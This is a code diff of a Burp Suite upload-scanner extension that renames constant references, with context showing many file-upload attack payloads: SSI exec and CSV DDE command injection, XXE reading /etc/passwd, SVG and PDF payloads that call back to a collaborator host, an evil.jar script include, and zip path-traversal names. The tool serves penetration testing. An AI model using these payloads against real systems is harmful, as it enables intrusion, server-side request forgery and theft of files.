@@ -1889,11 +1889,11 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             mime_asp = 'application/asp'
             mime_aspx = 'application/aspx'
             types = {
-                ('', BurpExtender.MARKER_ORIG_EXT, ''),
-                ('', '.asp;' + BurpExtender.MARKER_ORIG_EXT, ''),
+                ('', Constants.MARKER_ORIG_EXT, ''),
+                ('', '.asp;' + Constants.MARKER_ORIG_EXT, ''),
                 # ('', '.asp' + self._marker_orig_ext, mime_asp),
-                ('', '.asp\x00' + BurpExtender.MARKER_ORIG_EXT, ''),
-                ('', '.asp%00' + BurpExtender.MARKER_ORIG_EXT, ''),
+                ('', '.asp\x00' + Constants.MARKER_ORIG_EXT, ''),
+                ('', '.asp%00' + Constants.MARKER_ORIG_EXT, ''),
                 # ('', '.asp\x00' + self._marker_orig_ext, mime_asp),
                 # ('', '.asp%00' + self._marker_orig_ext, mime_asp),
                 ('', '.asp', ''),
@@ -1924,7 +1924,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
     def _servercode_rce_simple(self, injector, payload_func, param_func):
         payload, expect = payload_func()
         lang, types, content = param_func(None, None, payload)
-        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "Simple" + lang
+        basename = Constants.DOWNLOAD_ME + self.FILE_START + "Simple" + lang
         title = lang + " code injection" # via simple file upload"
         desc = 'Remote command execution through {} payload in a normal {} file. The server replaced the code {} inside ' \
                'the uploaded file with {} only, meaning that {} code ' \
@@ -1938,7 +1938,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         size = (injector.opts.image_width, injector.opts.image_height)
         for payload, expect, name, ext, content in bi.get_files(size, payload_func, formats):
             lang, types, content = param_func(ext, BackdooredFile.EXTENSION_TO_MIME[ext], content)
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "BfRce" + name + lang
+            basename = Constants.DOWNLOAD_ME + self.FILE_START + "BfRce" + name + lang
             # content_start = content[:content.index(payload)]
             # content_end = content[content.index(payload)+len(payload):]
             title = lang + " code injection"  # via " + ext[1:].upper() + " Metadata "
@@ -1958,7 +1958,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             # would even survive that. When implementing that, a generic approach which allows resizing first to sizes self._image_formating_width,
             # self._image_formating_height etc.
             lang = "PHP"
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "IdatchunkPng" + lang
+            basename = Constants.DOWNLOAD_ME + self.FILE_START + "IdatchunkPng" + lang
             content_start = "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00 \x00\x00\x00 \x08\x02\x00\x00\x00\xfc\x18\xed\xa3\x00\x00\x00\tpHYs\x00\x00\x0e\xc4\x00\x00\x0e\xc4\x01\x95+\x0e\x1b\x00\x00\x00`IDATH\x89c\\"
             content_end = "X\x80\x81\x81\xc1s^7\x93\xfc\x8f\x8b\xdb~_\xd3}\xaa'\xf7\xf1\xe3\xc9\xbf_\xef\x06|\xb200c\xd9\xb9g\xfd\xd9=\x1b\xce2\x8c\x82Q0\nF\xc1(\x18\x05\xa3`\x14\x8c\x82Q0\n\x86\r\x00\x00\x81\xb2\x1b\x02\x07x\r\x0c\x00\x00\x00\x00IEND\xaeB`\x82"
             # TODO feature: here we use a modified payload that is also an idat chunk
@@ -1987,7 +1987,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             # TODO feature: defining expect as "AB" is pretty stupid as that is not really unique....
             # GIF with payload not in exif but in file content that survives PHP's getimagesize() and imagecreatefromgif()
             # https://www.secgeek.net/bookfresh-vulnerability/#comment-331
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "InContentGif" + lang
+            basename = Constants.DOWNLOAD_ME + self.FILE_START + "InContentGif" + lang
             start = 'R0lGODlh1wBUAPf/APz9/ubr9Jx5G+ru9uTq9LikaP3opuXNiWB8hP378fb4++zw9+/y+OrUmenXp+Tp882tXWqFi9zCeNa5bP7yyfr6/eHI' \
                     'gcetZ09mbfDz+ZOXeN7EfExiaNbDh9m8cVF8ieLo8fv8/fDZm7Cztff4/P3ik+js9fDy+ODGfq6qhunRjP767OLJg9S3afL0+cyxabOaWv700' \
                     'f722Obq9KKacFlyelB6h/3+/omWhOjctdq+dNCxYdO6dMe6haWCJ/TpzNvAdqmKNl96gvHepvP1+jxlaNjc5P7uusq0clt1fFZudffu1fz8/V' \
@@ -2228,7 +2228,7 @@ Response.write(a&c&b)
                        "local ($k);\n" \
                        "$k = \"{}\";\n" \
                        "print $k . \"{}\";".format(commands, rand_a, rand_b)
-        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "Perl"
+        basename = Constants.DOWNLOAD_ME + self.FILE_START + "Perl"
         title = "Perl code injection"
         base_detail = 'The server executes Perl files that are uploaded, which results in a Remote Command Execution (RCE). '
         detail_download = "A Perl file was uploaded and in the download the code $k = '{}'; print $k . '{}'; was " \
@@ -2267,7 +2267,7 @@ Response.write(a&c&b)
                        "  urllib2.urlopen('{}').read()\n" \
                        "k = '{}'\n" \
                        "print k + '{}'".format(python3_url, python2_url, rand_a, rand_b)
-        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "Python"
+        basename = Constants.DOWNLOAD_ME + self.FILE_START + "Python"
         title = "Python code injection"
         base_detail = 'The server executes Python files that are uploaded, which results in a Remote Command Execution (RCE). '
         detail_download = "A Python file was uploaded and in the download the code k = '{}'; print k + '{}'; was " \
@@ -2301,7 +2301,7 @@ Response.write(a&c&b)
         content_ruby2 = "k = \"{}\"\n" \
                        "puts k + \"{}\"".format(ruby_url, rand_a, rand_b)
         content_ruby = content_ruby1 + content_ruby2
-        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "Ruby"
+        basename = Constants.DOWNLOAD_ME + self.FILE_START + "Ruby"
         title = "Ruby code injection"
         base_detail = 'The server executes Ruby files that are uploaded, which results in a Remote Command Execution (RCE). '
         detail_download = "A Ruby file was uploaded and in the download the code k = \"{}\"; puts k + \"{}\"; was " \
@@ -2344,7 +2344,7 @@ Response.write(a&c&b)
                       "<br>{}<br><br>"
 
         # Reflected nslookup - Simple
-        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SsiReflectDnsSimple"
+        basename = Constants.DOWNLOAD_ME + self.FILE_START + "SsiReflectDnsSimple"
         content, expect = self._ssi_payload()
         detail = main_detail.format(cgi.escape(content), cgi.escape(expect))
         issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
@@ -2355,7 +2355,7 @@ Response.write(a&c&b)
         bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self._global_opts.image_exiftool)
         size = (injector.opts.image_width, injector.opts.image_height)
         for payload, expect, name, ext, content in bi.get_files(size, self._ssi_payload):
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SsiReflectDns" + name
+            basename = Constants.DOWNLOAD_ME + self.FILE_START + "SsiReflectDns" + name
             detail = main_detail + "In this case the payload was injected into a file with metatadata of type {}."
             detail = detail.format(cgi.escape(content), cgi.escape(expect), name)
             issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
@@ -2378,7 +2378,7 @@ Response.write(a&c&b)
 
         # RCE with Burp collaborator - Simple
         for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SsiColab" + cmd_name
+            basename = Constants.DOWNLOAD_ME + self.FILE_START + "SsiColab" + cmd_name
             content = '<!--#exec cmd="{} {}" -->'.format(cmd, server)
             detail = "{}A {} payload was used. <br>Interactions: <br><br>".format(base_detail, cmd_name)
             issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
@@ -2396,7 +2396,7 @@ Response.write(a&c&b)
         bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self._global_opts.image_exiftool)
         size = (injector.opts.image_width, injector.opts.image_height)
         for payload, _, name, ext, content in bi.get_files(size, ssicolab.payload_func):
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SsiBfRce" + name
+            basename = Constants.DOWNLOAD_ME + self.FILE_START + "SsiBfRce" + name
             desc = base_desc.format(cgi.escape(name), cgi.escape(cmd_name))
             issue = self._create_issue_template(injector.get_brr(), issue_name, base_detail + desc, confidence, severity)
             colab_tests.extend(self._send_collaborator(injector, burp_colab, self.SSI_TYPES, basename,
@@ -2423,7 +2423,7 @@ Response.write(a&c&b)
                       "https://gosecure.net/2018/04/03/beyond-xss-edge-side-include-injection/. "
 
         # Reflected stripped esi tag - Simple
-        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "EsiReflectSimple"
+        basename = Constants.DOWNLOAD_ME + self.FILE_START + "EsiReflectSimple"
         content, expect = self._esi_payload()
         detail = base_detail.format(cgi.escape(content), cgi.escape(expect))
         issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
@@ -2434,7 +2434,7 @@ Response.write(a&c&b)
         bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self._global_opts.image_exiftool)
         size = (injector.opts.image_width, injector.opts.image_height)
         for payload, expect, name, ext, content in bi.get_files(size, self._esi_payload):
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "EsiReflect" + name
+            basename = Constants.DOWNLOAD_ME + self.FILE_START + "EsiReflect" + name
             detail = base_detail + "In this case the payload was injected into a file with metatadata of type {}."
             detail = detail.format(cgi.escape(content), cgi.escape(expect), name)
             issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
@@ -2450,8 +2450,8 @@ Response.write(a&c&b)
         # ESI injection - includes remote URL -> burp collaborator
         # According to feedback on https://github.com/modzero/mod0BurpUploadScanner/issues/11
         # this is unlikely to be successfully triggered
-        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "EsiColab"
-        content = '<esi:include src="{}1.html" alt="{}" onerror="continue"/>'.format(BurpExtender.MARKER_COLLAB_URL, BurpExtender.MARKER_CACHE_DEFEAT_URL)
+        basename = Constants.DOWNLOAD_ME + self.FILE_START + "EsiColab"
+        content = '<esi:include src="{}1.html" alt="{}" onerror="continue"/>'.format(Constants.MARKER_COLLAB_URL, Constants.MARKER_CACHE_DEFEAT_URL)
         detail = "A burp collaborator interaction was dectected when uploading an Edge Side Include file with a payload that " \
                  "includes a burp collaborator URL. The payload was an Edge Side Include (ESI) tag, see " \
                  "https://gosecure.net/2018/04/03/beyond-xss-edge-side-include-injection/. As it is unlikely " \
@@ -2483,8 +2483,8 @@ Response.write(a&c&b)
 
             # First, the SVG specific ones
             # External Image with <image xlink
-            content_xlink = base_svg.replace(text_tag, '<image height="30" width="30" xlink:href="{}image.jpeg" />'.format(BurpExtender.MARKER_COLLAB_URL))
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SvgXlink"
+            content_xlink = base_svg.replace(text_tag, '<image height="30" width="30" xlink:href="{}image.jpeg" />'.format(Constants.MARKER_COLLAB_URL))
+            basename = Constants.DOWNLOAD_ME + self.FILE_START + "SvgXlink"
             name = "XXE/SSRF via SVG"  # Xlink
             severity = "High"
             confidence = "Certain"
@@ -2492,7 +2492,7 @@ Response.write(a&c&b)
                      "which contains a burp collaborator URL. This means that Server Side Request Forgery is possible. " \
                      'The payload was <image xlink:href="{}" /> . ' + \
                      "Usually you will be able to read local files, eg. local pictures. " \
-                     "Interactions:<br><br>".format(BurpExtender.MARKER_COLLAB_URL)
+                     "Interactions:<br><br>".format(Constants.MARKER_COLLAB_URL)
             issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)
             colab_tests.extend(self._send_collaborator(injector, burp_colab, self.SVG_TYPES, basename, content_xlink, issue,
                                                   redownload=True))
@@ -2502,8 +2502,8 @@ Response.write(a&c&b)
             content_iframe = '<g><foreignObject width="{}" height="{}"><body xmlns="http://www.w3.org/1999/xhtml">' \
                              '<iframe src="{}"></iframe></body></foreignObject></g>'.format(str(injector.opts.image_width),
                                                                                             str(injector.opts.image_height),
-                                                                                            BurpExtender.MARKER_COLLAB_URL)
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SvgIframe"
+                                                                                            Constants.MARKER_COLLAB_URL)
+            basename = Constants.DOWNLOAD_ME + self.FILE_START + "SvgIframe"
             name = "XXE/SSRF via SVG"  # Iframe
             severity = "High"
             confidence = "Certain"
@@ -2511,7 +2511,7 @@ Response.write(a&c&b)
                      "which contains a burp collaborator URL. This means that Server Side Request Forgery is possible. " \
                      'The payload was <iframe src="{}"> . ' + \
                      "Usually you will be able to read local files, eg. local pictures. " \
-                     "Interactions:<br><br>".format(BurpExtender.MARKER_COLLAB_URL)
+                     "Interactions:<br><br>".format(Constants.MARKER_COLLAB_URL)
             issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)
             colab_tests.extend(self._send_collaborator(injector, burp_colab, self.SVG_TYPES, basename, content_iframe, issue,
                                                        redownload=True))
@@ -2520,7 +2520,7 @@ Response.write(a&c&b)
             # What if the server simply reads the SVG and turn it into a JPEG that has the content?
             # That will be hard to detect (would need something like OCR on JPEG), but at least the user
             # might see that picture... We also regex the download if we detect a passwd...
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SvgPasswdTxt"
+            basename = Constants.DOWNLOAD_ME + self.FILE_START + "SvgPasswdTxt"
             ref = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>'
             passwd_svg = base_svg
             passwd_svg = passwd_svg.replace(root_tag, ref)
@@ -2531,7 +2531,7 @@ Response.write(a&c&b)
                     resp = urr.download_rr.getResponse()
                     if resp:
                         resp = FloydsHelpers.jb2ps(resp)
-                        if BurpExtender.REGEX_PASSWD.match(resp):
+                        if Constants.REGEX_PASSWD.match(resp):
                             name = "SVG Local File Include"
                             severity = "High"
                             confidence = "Firm"
@@ -2544,7 +2544,7 @@ Response.write(a&c&b)
 
             # Now let's do the generic ones from the Xxe class
             for payload_desc, technique_name, svg in Xxe.get_payloads(base_svg, root_tag, text_tag, 'text'):
-                basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "XxeSvg" + technique_name
+                basename = Constants.DOWNLOAD_ME + self.FILE_START + "XxeSvg" + technique_name
                 name = "XXE/SSRF via SVG"  # " + technique_name
                 severity = "Medium"
                 confidence = "Certain"
@@ -2570,8 +2570,8 @@ Response.write(a&c&b)
             # The standard file we are going to use for the tests:
             base_svg = '<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" ' \
                        'version="1.0"><script type="application/java-archive" xlink:href="{}evil.jar' \
-                       '"/><text>test</text></svg>'.format(BurpExtender.MARKER_COLLAB_URL)
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SvgScriptJava"
+                       '"/><text>test</text></svg>'.format(Constants.MARKER_COLLAB_URL)
+            basename = Constants.DOWNLOAD_ME + self.FILE_START + "SvgScriptJava"
             name = "SVG Script Xlink Java Archive"
             severity = "Medium"
             confidence = "Certain"
@@ -2582,7 +2582,7 @@ Response.write(a&c&b)
                      "https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/batik_svg_java.rb " \
                      'The payload was <script type="application/java-archive" xlink:href="{}evil.jar"/> . ' \
                      "Usually you will be able to read local files, eg. local pictures. " \
-                     "Interactions:<br><br>".format(BurpExtender.MARKER_COLLAB_URL)
+                     "Interactions:<br><br>".format(Constants.MARKER_COLLAB_URL)
             issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)
             colab_tests.extend(self._send_collaborator(injector, burp_colab, self.SVG_TYPES, basename, base_svg, issue, redownload=True))
         return colab_tests
@@ -2600,7 +2600,7 @@ Response.write(a&c&b)
             base_xml = root_tag + test_tag
 
             for payload_desc, technique_name, xml in Xxe.get_payloads(base_xml, root_tag, test_tag, 'text'):
-                basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "XxeXml" + technique_name
+                basename = Constants.DOWNLOAD_ME + self.FILE_START + "XxeXml" + technique_name
                 name = "XML " + technique_name + " SSRF/XXE"
                 severity = "Medium"
                 confidence = "Certain"
@@ -2621,7 +2621,7 @@ Response.write(a&c&b)
             return colab_tests
         x = XxeOfficeDoc(injector.opts.get_enabled_file_formats())
         for payload, name, ext, content in x.get_files():
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "XxeOffice" + name
+            basename = Constants.DOWNLOAD_ME + self.FILE_START + "XxeOffice" + name
             title = "XXE/SSRF via XML" # " + ext[1:].upper()
             desc = 'XXE through injection of XML {} payloads in the contents of a {} file. The server parsed the code ' \
                    '{} which resulted in a SSRF. '.format(name, ext[1:].upper(), cgi.escape(payload))
@@ -2646,13 +2646,13 @@ Response.write(a&c&b)
         # Images with XMP tags.
         # Therefore this was entirely implemented in its own class... not a beauty, but it works
         x = XxeXmp(injector.opts.get_enabled_file_formats(), self._global_opts.image_exiftool, injector.opts.image_width,
-                   injector.opts.image_height, BurpExtender.MARKER_ORIG_EXT, BurpExtender.PROTOCOLS_HTTP, self.FILE_START,
+                   injector.opts.image_height, Constants.MARKER_ORIG_EXT, Constants.PROTOCOLS_HTTP, self.FILE_START,
                    self._make_http_request)
         return x.do_collaborator_tests(injector, burp_colab, injector.opts.get_enabled_file_formats())
 
     def _xss_html(self, injector):
         if injector.opts.file_formats['html'].isSelected():
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "HtmlXss"
+            basename = Constants.DOWNLOAD_ME + self.FILE_START + "HtmlXss"
             content = '<html><head></head><body>this is just a little html</body></html>'
             title = "Cross-site scripting (stored)" # via HTML file upload"
             desc = 'XSS via HTML file upload and download. '
@@ -2663,7 +2663,7 @@ Response.write(a&c&b)
 
     def _xss_svg(self, injector):
         if injector.opts.file_formats['svg'].isSelected():
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SvgXss"
+            basename = Constants.DOWNLOAD_ME + self.FILE_START + "SvgXss"
             content_svg = '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" ' \
                           '"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" baseProfile="full" ' \
                           'xmlns="http://www.w3.org/2000/svg" width="{}" height="{}"><polygon id="triangle" ' \
@@ -2678,7 +2678,7 @@ Response.write(a&c&b)
 
     def _xss_swf(self, injector):
         if injector.opts.file_formats['swf'].isSelected():
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "XssProject"
+            basename = Constants.DOWNLOAD_ME + self.FILE_START + "XssProject"
             content = 'Q1dTDmkGAAB4AWVU3VLbRhTe1dqW/2UDMeBAozQ0jgm2ZMMwgyGeUgwZbiATXyTDoPEs0gorkbUaScZmOpm+SSe96Wv0AXLjXrQP0KvO9KLuE6QriSB' \
                       'MNKOfPec7335nzzkag9hfAOR/BWAJgk5xGQDw0/wnCMCeo+mt150jcTwwLbfFVi8qfc+zW5I0Go3qo806dS6lxs7OjiQ3pWazxhA199ry8LhmuU8q7' \
                       'YCgQ1zVMWzPoJboE+ILOvReVCo3rJp6S2oPHTOg1FSJmGRALM+VGvUGI9LUlk6dAfba2LZNQ8U+nTSuuX2qvh/hK1LTTez296QI6Md4hmeS9r5GL4h' \
@@ -2713,7 +2713,7 @@ Response.write(a&c&b)
         bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self._global_opts.image_exiftool)
         size = (injector.opts.image_width, injector.opts.image_height)
         for payload, expect, name, ext, content in bi.get_files(size, self._xss_payload):
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "BfXss" + name
+            basename = Constants.DOWNLOAD_ME + self.FILE_START + "BfXss" + name
             title = "Cross-site scripting (stored)" # via " + ext[1:].upper() + " Metadata"
             desc = 'XSS through injection of HTML in Metadata of type ' + name + '. The server ' \
                     'reflected the code ' + cgi.escape(
@@ -2729,7 +2729,7 @@ Response.write(a&c&b)
         # https://en.wikipedia.org/wiki/GTUBE
         # Additionally, it is hard to test if "illegal" content such as adult content can be uploaded as
         # there is no test file for that.
-        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "Eicar"
+        basename = Constants.DOWNLOAD_ME + self.FILE_START + "Eicar"
         content_eicar = "WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDK" + "Td9JEVJQ0FSLVNUQU5EQVJEL" + "UFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo="
         content_eicar = content_eicar.decode("base64")
         title = "Malicious Eicar upload/download"
@@ -2750,7 +2750,7 @@ Response.write(a&c&b)
 
         if injector.opts.file_formats['pdf'].isSelected():
             #A boring PDF with some JavaScript
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "PdfJavascript"
+            basename = Constants.DOWNLOAD_ME + self.FILE_START + "PdfJavascript"
             content = '%PDF-1.0\n%\xbf\xf7\xa2\xfe\n%QDF-1.0\n\n%% Original object ID: 1 0\n1 0 obj\n<<\n  /AA <<\n    ' \
                       '/WC <<\n      /JS (app.alert\\("http://www.corkami.com \\(Closing\\)"\\);)\n      /S /\n    >>\n' \
                       '  >>\n  /OpenAction <<\n    /JS (app.alert\\("http://www.corkami.com \\(Open Action\\)"\\);)\n  ' \
@@ -2835,7 +2835,7 @@ trailer
 >>
 %%EOF
 '''
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "BadPdf"
+            basename = Constants.DOWNLOAD_ME + self.FILE_START + "BadPdf"
             title_download = "Malicious PDF with JavaScript upload/download"
             title_colab = "Bad PDF interaction"
             base_detail = 'The payload was the bad PDF as described here: https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py . ' \
@@ -2871,13 +2871,13 @@ trailer
       /S/JavaScript
       /JS(
       eval(
-          'app.openDoc({cPath: encodeURI("'''+BurpExtender.MARKER_COLLAB_URL+'''"), cFS: "CHTTP" });'
+          'app.openDoc({cPath: encodeURI("'''+Constants.MARKER_COLLAB_URL+'''"), cFS: "CHTTP" });'
           );
       )
       >>
   >>
 >>'''
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "JsOpenDocPdf"
+            basename = Constants.DOWNLOAD_ME + self.FILE_START + "JsOpenDocPdf"
             title_download = "Malicious PDF with JavaScript upload/download"
             title_colab = "PDF JavaScript openDoc interaction"
             base_detail = 'The payload was a PDF JavaScript with app.openDoc, similar to the one here: ' \
@@ -2944,8 +2944,8 @@ trailer <<
         >>
         /Pages <<>>
     >>
->>'''.format(BurpExtender.MARKER_COLLAB_URL)
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "FormSubmitPdf"
+>>'''.format(Constants.MARKER_COLLAB_URL)
+            basename = Constants.DOWNLOAD_ME + self.FILE_START + "FormSubmitPdf"
             title_download = "Malicious PDF with JavaScript upload/download"
             title_colab = "PDF form submit interaction"
             base_detail = 'The payload was an auto submit PDF form, similar to the one here: ' \
@@ -2978,7 +2978,7 @@ trailer <<
                   'ShowCommand=7\r\n' \
                   'Modified=20F06BA06D07BD014D\r\n' \
                   'HotKey=1601'
-        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "UrlInternetShortcut"
+        basename = Constants.DOWNLOAD_ME + self.FILE_START + "UrlInternetShortcut"
         title_download = "Malicious URL file upload/download"
         title_colab = "URL file interaction"
         base_detail = 'The payload was a Windows .URL shortcut file, similar to the one here: ' \
@@ -3000,7 +3000,7 @@ trailer <<
         # The same with Desktop.ini
         content = '[.ShellClassInfo]\r\n' \
                   'IconResource=\\\\test.example.org\\\r\n'
-        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "DesktopIni"
+        basename = Constants.DOWNLOAD_ME + self.FILE_START + "DesktopIni"
         title_download = "Malicious Desktop.ini file upload/download"
         title_colab = "URL file interaction"
         base_detail = 'The payload was a Windows Desktop.ini file, similar to the one here: ' \
@@ -3035,7 +3035,7 @@ trailer <<
                          'https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/ for more details. '
             software_payload = (("Excel", "=cmd|' /C {} {}'!A0"), ("OpenOffice", '=DDE("cmd";"/C {} {}";"__DdeLink_60_870516294")'))
             for software_name, payload in software_payload:
-                basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "Csv" + software_name
+                basename = Constants.DOWNLOAD_ME + self.FILE_START + "Csv" + software_name
                 formula = payload.format("nslookup", "unknown.domain.example.org")
                 issue = self._create_issue_template(injector.get_brr(), title_download, desc_download.format(formula, software_name), "Tentative", "Low")
                 # Do simple upload/download based
@@ -3067,7 +3067,7 @@ trailer <<
                                                                         content, issue, replace=replace, redownload=True))
 
         if injector.opts.file_formats['xlsx'].isSelected():
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "Excel"
+            basename = Constants.DOWNLOAD_ME + self.FILE_START + "Excel"
             content_excel = 'eJztXQk8lNvfPzPGGFuWZC2mspWxr10hSUrIUilClkER7ljaiKJFi6JVud26bpcWktJKom5SlEjlqlvaQ2mn5TbvOc8YM/PMGLzL//O+/3d+Ps8zz/Ob' \
                              'c77f3znnd9Y5z6PhpsKjA8fV2wBO7IEY+MGUBGQuHQEepuwbeQC/ZzLRJfvTBB5MkfyfEkkKLEiyOFCcUi9RC4iATAGgDX6WkKrgGYDH8JgP4gAJgMR' \
                              '4OoP6r5LJmA3BBGTDReh4dvCKAPKgVgGoYZYpYufh2PkYFq4cO9vBbzCZEadi0+u3c4mTsHCbsfMY7DwMIMTTWJy/MI0p0AT34ScFbEWuTgRjJAhOIB' \
@@ -3156,12 +3156,12 @@ trailer <<
             self._send_simple(injector, self.EXCEL_TYPES, basename, content_excel, redownload=True)
             # TODO feature: Burp collaborator based for Excel format...
 
-        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "IqyExcel"
+        basename = Constants.DOWNLOAD_ME + self.FILE_START + "IqyExcel"
         title = "Malicious IQY upload/download"
         desc = 'A IQY file with the content pointing to a URL was uploaded and downloaded. When this file is opened in ' \
                'Microsoft Excel, and the user confirms dialogues warning or the server automatically parses it, a ' \
                'server is contacted. See https://twitter.com/subTee/status/631509345918783489 for more details.'
-        content = 'WEB\r\n1\r\n{}["a","Please Enter Your Password"]'.format(BurpExtender.MARKER_COLLAB_URL)
+        content = 'WEB\r\n1\r\n{}["a","Please Enter Your Password"]'.format(Constants.MARKER_COLLAB_URL)
         issue = self._create_issue_template(injector.get_brr(), title, desc, "Tentative", "Low")
         self.dl_matchers.add(DownloadMatcher(issue, filecontent=content))
         self._send_simple(injector, self.IQY_TYPES, basename + "Mal", content, redownload=True)
@@ -3190,18 +3190,18 @@ trailer <<
                           "somewhere where no files should be unpacked to, you have a vulnerability in handling " \
                           "zip file names that include ../ ."
             files = [
-                ("../" + BurpExtender.DOWNLOAD_ME + "info1", filecontent),
-                ("../../" + BurpExtender.DOWNLOAD_ME + "info2", filecontent),
-                ("../../../" + BurpExtender.DOWNLOAD_ME + "info3", filecontent),
-                ("../../../../../../../../../../../var/www/" + BurpExtender.DOWNLOAD_ME + "info4", filecontent),
+                ("../" + Constants.DOWNLOAD_ME + "info1", filecontent),
+                ("../../" + Constants.DOWNLOAD_ME + "info2", filecontent),
+                ("../../../" + Constants.DOWNLOAD_ME + "info3", filecontent),
+                ("../../../../../../../../../../../var/www/" + Constants.DOWNLOAD_ME + "info4", filecontent),
 
-                ("info/../../../" + BurpExtender.DOWNLOAD_ME + "info5", filecontent),
+                ("info/../../../" + Constants.DOWNLOAD_ME + "info5", filecontent),
 
-                ("\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f" + BurpExtender.DOWNLOAD_ME + "info6", filecontent),
-                ("info\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f" + BurpExtender.DOWNLOAD_ME + "info7", filecontent),
+                ("\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f" + Constants.DOWNLOAD_ME + "info6", filecontent),
+                ("info\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f\\x2e\\x2e\\x2f" + Constants.DOWNLOAD_ME + "info7", filecontent),
 
-                ("%2e%2e%2f%2e%2e%2f%2e%2e%2f" + BurpExtender.DOWNLOAD_ME + "info8", filecontent),
-                ("info%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f" + BurpExtender.DOWNLOAD_ME + "info9", filecontent),
+                ("%2e%2e%2f%2e%2e%2f%2e%2e%2f" + Constants.DOWNLOAD_ME + "info8", filecontent),
+                ("info%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f" + Constants.DOWNLOAD_ME + "info9", filecontent),
 
                 # ("../../../../../../../../../../../usr/var/www/" + self._download_me + "info10", filecontent),
                 # ("../../../../../../../../../../../Local/Library/WebServer/" + self._download_me + "info11", filecontent),
@@ -3229,7 +3229,7 @@ trailer <<
         # While I thought about implementing a GIFAR payload, I don't think it is worth doing nowadays
 
         if injector.opts.file_formats['jpeg'].isSelected():
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "PolyJpegCsp"
+            basename = Constants.DOWNLOAD_ME + self.FILE_START + "PolyJpegCsp"
             content = '/9j/4Ak6SkZJRi8qAQEASABI'
             content += 3096 * "A"  # the nulls in the header base64 encode to A...
             content += 'Ki89YWxlcnQoIkJ1cnAgcm9ja3MuIik7Lyr/2wBDAB4UFhoWEx4aGBohHx4jLEowLCkpLFtBRDZKa15xb2leaGZ2haqQdn6hgGZolMqWobC1v8C/c4' \
@@ -3247,7 +3247,7 @@ trailer <<
             content = content.decode("base64")
             types = {
                 # ('', self._marker_orig_ext, ''),
-                ('', BurpExtender.MARKER_ORIG_EXT, 'image/jpeg'),
+                ('', Constants.MARKER_ORIG_EXT, 'image/jpeg'),
                 ('', '.jpg', ''),
                 ('', '.jpg', 'image/jpeg'),
             }
